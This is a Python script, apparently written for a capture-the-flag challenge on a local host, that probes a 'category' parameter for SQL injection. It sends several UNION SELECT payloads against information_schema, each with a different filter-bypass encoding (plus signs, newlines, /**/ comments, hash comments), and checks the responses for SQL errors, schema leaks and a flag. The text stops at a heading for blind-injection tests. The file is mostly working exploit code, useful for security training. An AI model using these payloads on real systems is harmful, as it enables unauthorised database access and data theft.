import requests
import urllib.parse
import time
import re

# Target and session setup
target = "http://127.0.0.1:32780/"
session_cookie = "PHPSESSID=a619c2d322b0d2025997d9751eb6d09a"
headers = {"Cookie": session_cookie}

print("=" * 80)
print("SQL Injection Bypass Testing")
print("=" * 80)

def send_payload(payload, description):
    print(f"\n[+] Testing: {description}")
    print(f"Raw payload: {payload}")
    
    url_encoded = urllib.parse.quote(payload, safe='')
    print(f"URL encoded: {url_encoded}")
    
    url = f"{target}?category={url_encoded}"
    print(f"Full URL: {url}")
    
    try:
        start_time = time.time()
        response = requests.get(url, headers=headers, timeout=15)
        elapsed = time.time() - start_time
        
        print(f"Status: {response.status_code}")
        print(f"Response time: {elapsed:.2f}s")
        print(f"Content length: {len(response.text)} bytes")
        
        # Look for SQL errors
        sql_errors = [
            r"SQL syntax",
            r"mysql_fetch",
            r"mysql_error",
            r"database",
            r"query",
            r"Unknown column",
            r"syntax error",
            r"SQLSTATE",
            r"SQL error",
            r"division by zero"
        ]
        
        found_errors = []
        for error_pattern in sql_errors:
            if re.search(error_pattern, response.text, re.I):
                found_errors.append(error_pattern)
        
        if found_errors:
            print(f"[!] SQL ERROR DETECTED: {', '.join(found_errors)}")
        
        # Check for database structure leaks
        if "information_schema" in response.text.lower() or "mysql" in response.text.lower():
            print("[!] POTENTIAL DATA LEAK IN RESPONSE")
        
        # Check for table/column names
        table_patterns = re.findall(r'\b(\w+)\.(\w+)\b', response.text)
        if table_patterns:
            print(f"[!] Found table references: {list(set(table_patterns))}")
        
        # Look for flag pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!!!] FLAG FOUND: {flag_match.group()}")
            print(response.text)
        
        print(f"Response preview (first 800 chars):\n{response.text[:800]}")
        
        return {
            'status': response.status_code,
            'time': elapsed,
            'size': len(response.text),
            'has_errors': bool(found_errors),
            'text': response.text
        }
        
    except Exception as e:
        print(f"[!] Error: {e}")
        return {'error': str(e)}

# Test 1: Basic UNION with URL encoding variations
print("\n" + "=" * 80)
print("TEST SUITE 1: URL Encoding Variations")
print("=" * 80)

tests = [
    {
        'payload': "' UNION SELECT 1,2,3,4,5 FROM information_schema.tables-- ",
        'description': "Basic UNION with space and comment"
    },
    {
        'payload': "'+UNION+SELECT+1,2,3,4,5+FROM+information_schema.tables--",
        'description': "All spaces as plus signs"
    },
    {
        'payload': "'%0aUNION%0aSELECT%0a1,2,3,4,5%0aFROM%0ainformation_schema.tables--",
        'description': "Newline encoding %0a instead of spaces"
    },
    {
        'payload': "'/**/UNION/**/SELECT/**/1,2,3,4,5/**/FROM/**/information_schema.tables--",
        'description': "SQL comment /**/ as space replacement"
    },
    {
        'payload': "' UNION SELECT 1,2,3,4,5 FROM information_schema.tables#",
        'description': "Hash comment instead of double dash"
    }
]

results = []
for test in tests:
    result = send_payload(test['payload'], test['description'])
    result['test'] = test['description']
    results.append(result)
    time.sleep(0.5)  # Small delay between requests

# Test 2: Boolean-based blind injection
